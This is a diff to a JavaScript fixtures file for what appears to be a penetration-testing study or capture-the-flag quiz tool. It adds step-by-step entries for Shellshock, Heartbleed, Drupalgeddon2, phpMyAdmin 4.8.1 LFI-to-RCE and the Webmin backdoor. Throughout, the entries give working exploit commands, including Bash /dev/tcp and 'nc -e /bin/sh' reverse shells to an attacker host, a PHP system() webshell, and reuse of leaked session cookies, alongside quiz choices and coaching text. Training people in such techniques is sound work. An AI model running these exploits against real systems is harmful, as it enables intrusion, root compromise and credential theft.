@@ -7092,6 +7092,483 @@
         "rdp-enum": "Enumeration confirmed the version already; the script says vulnerable, so the exploit is the move.",
         "smbghost": "That is the SMBv3 compression bug on 445; this is the RDP pre-auth bug on 3389."
       }
+    },
+    "shellshock": {
+      "why": "Shellshock is a bug in Bash itself, not in any web app. When a CGI script passes an HTTP header into an environment variable, a vulnerable Bash keeps parsing past the end of a function definition and runs whatever command you append. So a single crafted header, sent to any /cgi-bin/ script, runs as the web server user. The one piece of real work is finding a CGI endpoint, because without a script that reaches Bash there is nothing to trigger. Discover the endpoint, confirm with id, then take a shell.",
+      "cmd": "curl -s -H 'User-Agent: () { :;}; echo; echo; /usr/bin/id' http://{{target}}/cgi-bin/status.sh",
+      "tool": "curl",
+      "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "signal": "uid=33(www-data)",
+      "teach": "The id output in the response proves Bash ran your command through the CGI script. Swap id for a reverse-shell one-liner in the same header to get an interactive shell.",
+      "leadup": [
+        {
+          "key": "cgi",
+          "label": "A CGI endpoint exists",
+          "steps": [
+            {
+              "title": "Discover a script under /cgi-bin/",
+              "tool": "gobuster",
+              "where": "local",
+              "cmd": "gobuster dir -u http://{{target}}/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl",
+              "out": "/status.sh           (Status: 200) [Size: 102]",
+              "sig": "status.sh",
+              "teach": "A reachable script under /cgi-bin/ is the thing that passes your header into Bash."
+            }
+          ]
+        },
+        {
+          "key": "web",
+          "label": "An old Apache is up",
+          "steps": [
+            {
+              "title": "Check the server banner",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -I http://{{target}}/",
+              "out": "HTTP/1.1 200 OK\nServer: Apache/2.4.7 (Ubuntu)",
+              "sig": "Server: Apache",
+              "teach": "Shellshock lives behind old Apache mod_cgi; confirm the server, then hunt for a CGI script."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Shellshock is find a /cgi-bin/ script, confirm with id through a header, then send a reverse shell the same way.",
+        "items": [
+          {
+            "t": "Find a CGI script",
+            "d": "Content discovery against /cgi-bin/ with script extensions finds the endpoint that reaches Bash.",
+            "demo": [
+              {
+                "run": "gobuster dir -u http://{{target}}/cgi-bin/ -x cgi,sh,pl -w /usr/share/wordlists/dirb/common.txt",
+                "out": "/status.sh           (Status: 200)",
+                "sig": "status.sh"
+              }
+            ],
+            "note": "You need a concrete script; the bug triggers only through one that reaches Bash."
+          },
+          {
+            "t": "Confirm with id",
+            "d": "Send the function-definition header with id appended; a uid line in the response proves execution.",
+            "demo": [
+              {
+                "run": "curl -s -H 'User-Agent: () { :;}; echo; echo; /usr/bin/id' http://{{target}}/cgi-bin/status.sh",
+                "out": "uid=33(www-data) gid=33(www-data)",
+                "sig": "uid=33(www-data)"
+              }
+            ],
+            "note": "A uid line means Bash executed your command; now go for a shell."
+          },
+          {
+            "t": "Take a reverse shell",
+            "d": "Replace id with a Bash reverse-shell one-liner in the same header.",
+            "demo": [
+              {
+                "run": "curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/{{lhost}}/4444 0>&1' http://{{target}}/cgi-bin/status.sh",
+                "out": "(no response; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the connection lands as the web user."
+          }
+        ]
+      },
+      "situation": "Content discovery finds /cgi-bin/status.sh on an old Apache, and a crafted User-Agent header returns a uid line. What is the move?",
+      "choices": [
+        "shellshock",
+        "command-injection",
+        "content-discovery",
+        "check-log4shell"
+      ],
+      "coach": {
+        "command-injection": "This is Bash parsing a header, not app input validation; the CGI header vector is Shellshock specifically.",
+        "content-discovery": "That already did its job by finding the CGI script; now exploit it.",
+        "check-log4shell": "Log4Shell is a Java JNDI bug; this is Bash through CGI, a different stack entirely."
+      }
+    },
+    "heartbleed": {
+      "why": "Heartbleed is a disclosure bug, not code execution. A vulnerable OpenSSL answers a malformed TLS heartbeat with up to 64 kilobytes of whatever is in its memory at that moment, which often includes session cookies, login credentials, and sometimes private key material. Because the leak is a random slice of memory, the technique is to dump many times and grep each response for anything reusable, then take those secrets to the front door. Confirm it with the nmap script first so you do not waste time on a patched host.",
+      "cmd": "nmap -p443 --script ssl-heartbleed {{target}}",
+      "tool": "nmap",
+      "output": "| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in OpenSSL",
+      "signal": "VULNERABLE",
+      "teach": "The ssl-heartbleed script confirms the host leaks memory. Dump the heartbeat repeatedly and grep each response for passwords, cookies, and tokens you can reuse.",
+      "leadup": [
+        {
+          "key": "confirm",
+          "label": "The host is confirmed vulnerable",
+          "steps": [
+            {
+              "title": "Run the heartbleed script",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p443 --script ssl-heartbleed {{target}}",
+              "out": "|   VULNERABLE:\n|   The Heartbleed Bug",
+              "sig": "VULNERABLE",
+              "teach": "No point dumping memory from a patched server; confirm first."
+            }
+          ]
+        },
+        {
+          "key": "tls",
+          "label": "A TLS service is exposed",
+          "steps": [
+            {
+              "title": "See the HTTPS port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p443 {{target}}",
+              "out": "443/tcp open  https",
+              "sig": "443/tcp open",
+              "teach": "The leak is in the TLS layer, so any OpenSSL-backed service on 443 or 8443 is a candidate."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Heartbleed is confirm the leak, dump memory in a loop, grep for secrets, then reuse them.",
+        "items": [
+          {
+            "t": "Confirm the leak",
+            "d": "The nmap script is safe and tells you whether the heartbeat over-reads memory.",
+            "demo": [
+              {
+                "run": "nmap -p443 --script ssl-heartbleed {{target}}",
+                "out": "|   VULNERABLE:",
+                "sig": "VULNERABLE"
+              }
+            ],
+            "note": "A patched OpenSSL returns nothing useful; move on if it is not vulnerable."
+          },
+          {
+            "t": "Dump memory and grep",
+            "d": "Dump the heartbeat many times and filter each response for credential-shaped strings.",
+            "demo": [
+              {
+                "run": "python2 32764.py {{target}} -p 443 -n 100 | grep -Ei 'pass|cookie|session'",
+                "out": "Cookie: PHPSESSID=8a2b1f; user=admin; pass=Spring2026!",
+                "sig": "pass=Spring2026!"
+              }
+            ],
+            "note": "The slice is random, so repeat; each dump may hold different memory."
+          },
+          {
+            "t": "Reuse what you found",
+            "d": "Take a leaked credential or session cookie to the login or app and confirm it works.",
+            "demo": [
+              {
+                "run": "curl -s -b 'PHPSESSID=8a2b1f' http://{{target}}/admin/ | grep -i welcome",
+                "out": "<h1>Welcome, admin</h1>",
+                "sig": "Welcome, admin"
+              }
+            ],
+            "note": "A leaked secret is only useful once you spend it somewhere; that is the real objective."
+          }
+        ]
+      },
+      "situation": "nmap reports the HTTPS service on 443 VULNERABLE to ssl-heartbleed. What is the move?",
+      "choices": [
+        "heartbleed",
+        "check-tls-config",
+        "recon-web-triage",
+        "sqli-basics"
+      ],
+      "coach": {
+        "check-tls-config": "TLS posture checks note weak ciphers; Heartbleed is a memory leak you actively dump, which is the move here.",
+        "recon-web-triage": "General web recon is fine, but a confirmed Heartbleed is a direct secret-harvest, so take it.",
+        "sqli-basics": "No database input is in play; the leak is in the TLS layer, not the app."
+      }
+    },
+    "drupalgeddon2": {
+      "why": "Drupalgeddon2 is an unauthenticated flaw in how Drupal renders form elements, where attacker input in a request parameter is evaluated and reaches code execution with no login. Versions below 7.58 and below 8.5.1 are affected, and CHANGELOG.txt usually tells you the exact version with no guessing. Once confirmed, a public proof of concept gives you an interactive webshell on the first request. It is one of the most dependable footholds on an old Drupal site.",
+      "cmd": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
+      "tool": "curl",
+      "output": "Drupal 7.57, 2018-02-21",
+      "signal": "Drupal 7.57",
+      "teach": "CHANGELOG.txt shows Drupal 7.57, below the 7.58 fix, so the form-render RCE applies. Run the proof of concept for a webshell.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The version is below the fix",
+          "steps": [
+            {
+              "title": "Read the CHANGELOG",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
+              "out": "Drupal 7.57, 2018-02-21",
+              "sig": "Drupal 7.57",
+              "teach": "Below 7.58 or 8.5.1 is vulnerable; anything newer is patched."
+            }
+          ]
+        },
+        {
+          "key": "fingerprint",
+          "label": "The app is Drupal",
+          "steps": [
+            {
+              "title": "Confirm the CMS",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/ | grep -i generator",
+              "out": "<meta name=\"Generator\" content=\"Drupal 7 (https://www.drupal.org)\" />",
+              "sig": "Drupal 7",
+              "teach": "The generator meta tag names Drupal; read CHANGELOG.txt next for the exact version."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Drupalgeddon2 is read the version, run the PoC for a webshell, then run commands as the web user.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "CHANGELOG.txt is world-readable on most installs and names the exact version.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
+                "out": "Drupal 7.57, 2018-02-21",
+                "sig": "Drupal 7.57"
+              }
+            ],
+            "note": "Below 7.58 or 8.5.1 is vulnerable; anything newer is patched."
+          },
+          {
+            "t": "Run the proof of concept",
+            "d": "The public PoC confirms the bug and drops an interactive webshell prompt.",
+            "demo": [
+              {
+                "run": "ruby Drupalgeddon2/drupalgeddon2.rb http://{{target}}/",
+                "out": "[+] Result : uid=33(www-data) gid=33(www-data)\ndrupalgeddon2>>",
+                "sig": "drupalgeddon2>>"
+              }
+            ],
+            "note": "The prompt runs commands on the target as the web user."
+          },
+          {
+            "t": "Run commands as the web user",
+            "d": "Confirm who you are, then upgrade to a full reverse shell for stability.",
+            "demo": [
+              {
+                "run": "drupalgeddon2>> id",
+                "out": "uid=33(www-data) gid=33(www-data)",
+                "sig": "www-data"
+              }
+            ],
+            "note": "Catch a proper reverse shell next, then enumerate for privilege escalation."
+          }
+        ]
+      },
+      "situation": "CHANGELOG.txt on a Drupal site reads Drupal 7.57. What is the move?",
+      "choices": [
+        "drupalgeddon2",
+        "wordpress",
+        "content-discovery",
+        "sqli-basics"
+      ],
+      "coach": {
+        "wordpress": "Wrong CMS; this is Drupal, and the version is below the Drupalgeddon2 fix.",
+        "content-discovery": "You already have the version from CHANGELOG; exploit it rather than keep browsing.",
+        "sqli-basics": "The bug is in form rendering, not a SQL parameter; the RCE PoC is the direct path."
+      }
+    },
+    "phpmyadmin-lfi": {
+      "why": "phpMyAdmin 4.8.0 and 4.8.1 include a file named in the index.php target parameter without checking it properly, which is a local file inclusion. On its own that reads files, but chained with the SQL console it becomes code execution: you run a query whose text is PHP, which phpMyAdmin writes verbatim into your session file on disk, then you point the inclusion at that session file and it executes. The SQL step needs a login, which on these targets is often a default or a credential you already hold. Confirm the version, poison the session, then include it.",
+      "cmd": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
+      "tool": "curl",
+      "output": "Version 4.8.1",
+      "signal": "Version 4.8.1",
+      "teach": "phpMyAdmin 4.8.1 is vulnerable. Run a SELECT that contains PHP to write it into your session file, then include that file through the target parameter to execute it.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The version is 4.8.0 or 4.8.1",
+          "steps": [
+            {
+              "title": "Read the README version",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
+              "out": "Version 4.8.1",
+              "sig": "Version 4.8.1",
+              "teach": "Only 4.8.0 and 4.8.1 carry this LFI; a different version needs another way in."
+            }
+          ]
+        },
+        {
+          "key": "login",
+          "label": "You can log in to reach the SQL tab",
+          "steps": [
+            {
+              "title": "Get a session cookie",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -c cookies.txt 'http://{{target}}/phpmyadmin/index.php'",
+              "out": "Set-Cookie: phpMyAdmin=abc123; path=/",
+              "sig": "phpMyAdmin=abc123",
+              "teach": "You need a session and a working login to reach the SQL tab, the step that poisons the file."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "phpMyAdmin LFI is confirm 4.8.x, log PHP into your session file via the SQL tab, then include that file through the target parameter.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "The README names the version; only 4.8.0 and 4.8.1 are affected.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
+                "out": "Version 4.8.1",
+                "sig": "Version 4.8.1"
+              }
+            ],
+            "note": "A newer build patched the target-parameter check."
+          },
+          {
+            "t": "Poison the session file",
+            "d": "In the SQL tab, run a query whose result text is PHP; phpMyAdmin stores it in your session file on disk.",
+            "demo": [
+              {
+                "run": "SELECT '<?php system($_GET[0]); ?>'",
+                "out": "Showing rows 0 - 0 (1 total)",
+                "sig": "1 total"
+              }
+            ],
+            "note": "The query need not touch a real table; the point is to write the PHP string into the session."
+          },
+          {
+            "t": "Include the session and run a command",
+            "d": "Point the target parameter at your session file on disk and pass the command in parameter 0.",
+            "demo": [
+              {
+                "run": "curl 'http://{{target}}/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_abc123&0=id' -b 'phpMyAdmin=abc123'",
+                "out": "uid=33(www-data) gid=33(www-data)",
+                "sig": "www-data"
+              }
+            ],
+            "note": "Swap id for a reverse-shell command once the include executes."
+          }
+        ]
+      },
+      "situation": "A phpMyAdmin README reads Version 4.8.1 and you have a working login. What is the move?",
+      "choices": [
+        "phpmyadmin-lfi",
+        "sqli-basics",
+        "lfi-probe",
+        "content-discovery"
+      ],
+      "coach": {
+        "sqli-basics": "You already have database access through the panel; the win is the LFI-to-RCE chain, not blind SQLi.",
+        "lfi-probe": "The inclusion point is known (the target parameter); here you weaponise it with the session poison, not just probe for files.",
+        "content-discovery": "The panel and version are already found; exploit the known CVE."
+      }
+    },
+    "webmin-rce": {
+      "why": "A tampered Webmin release, versions 1.890 through 1.920 with password expiry enabled, passes the new-password field of the password-reset page straight into a shell, so an unauthenticated request runs a command as root. Webmin runs as root to manage the box, which is why the shell you get is root rather than a web user. The only precondition beyond the version is that password expiry is switched on, which these targets usually have. Confirm Webmin on 10000, then one crafted request to password_change.cgi calls back as root.",
+      "cmd": "curl -sk https://{{target}}:10000/ | grep -i webmin",
+      "tool": "curl",
+      "output": "<title>Login to Webmin</title>",
+      "signal": "Webmin",
+      "teach": "Webmin is listening on 10000. If the version is 1.890 to 1.920 with password expiry enabled, the password-reset page injects your command and runs it as root.",
+      "leadup": [
+        {
+          "key": "present",
+          "label": "Webmin is confirmed on 10000",
+          "steps": [
+            {
+              "title": "Confirm the panel",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:10000/ | grep -i webmin",
+              "out": "<title>Login to Webmin</title>",
+              "sig": "Webmin",
+              "teach": "Webmin on 10000 that banners the login page is the target; check the version next."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "Port 10000 is open",
+          "steps": [
+            {
+              "title": "See the open port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p10000 -sV {{target}}",
+              "out": "10000/tcp open  http    MiniServ 1.910 (Webmin httpd)",
+              "sig": "MiniServ 1.910",
+              "teach": "MiniServ is Webmin's server; the version here is in the 1.890 to 1.920 vulnerable range."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Webmin RCE is confirm the version on 10000, start a listener, then one request to password_change.cgi with a command in the new-password field.",
+        "items": [
+          {
+            "t": "Confirm Webmin and the version",
+            "d": "Banner the login page and read the MiniServ version; 1.890 to 1.920 is vulnerable.",
+            "demo": [
+              {
+                "run": "nmap -p10000 -sV {{target}}",
+                "out": "10000/tcp open  http    MiniServ 1.910 (Webmin httpd)",
+                "sig": "MiniServ 1.910"
+              }
+            ],
+            "note": "Newer builds removed the backdoored code, so the version is the gate."
+          },
+          {
+            "t": "Start your listener",
+            "d": "The injected command calls back, so have a listener ready first.",
+            "demo": [
+              {
+                "run": "nc -lvnp 4444",
+                "out": "listening on [any] 4444 ...",
+                "sig": "listening on"
+              }
+            ],
+            "note": "Webmin runs as root, so the connection lands as root."
+          },
+          {
+            "t": "Fire the injection",
+            "d": "Send the password-reset request with a command piped into the new-password field.",
+            "demo": [
+              {
+                "run": "curl -sk 'https://{{target}}:10000/password_change.cgi' -H 'Referer: https://{{target}}:10000/session_login.cgi' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1' --data 'user=rootxx&pam=&expired=2&old=test&new1=test&new2=test|nc {{lhost}} 4444 -e /bin/sh|'",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "The pipe in the new-password field runs nc as root; catch the shell."
+          },
+          {
+            "t": "Confirm root",
+            "d": "On the catch, confirm the identity; Webmin's privilege makes this an immediate root shell.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "You are root; capture proof and move to the flags."
+          }
+        ]
+      },
+      "situation": "Webmin answers on port 10000 and the version is MiniServ 1.910. What is the move?",
+      "choices": [
+        "webmin-rce",
+        "online-brute-rdp",
+        "content-discovery",
+        "recon-web-triage"
+      ],
+      "coach": {
+        "online-brute-rdp": "Wrong service and port; Webmin on 10000 has a direct unauthenticated RCE, no brute needed.",
+        "content-discovery": "You already know the service and version; exploit the known CVE.",
+        "recon-web-triage": "General triage is done; the version is in the vulnerable range, so take the shell."
+      }
     }
   };
   Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
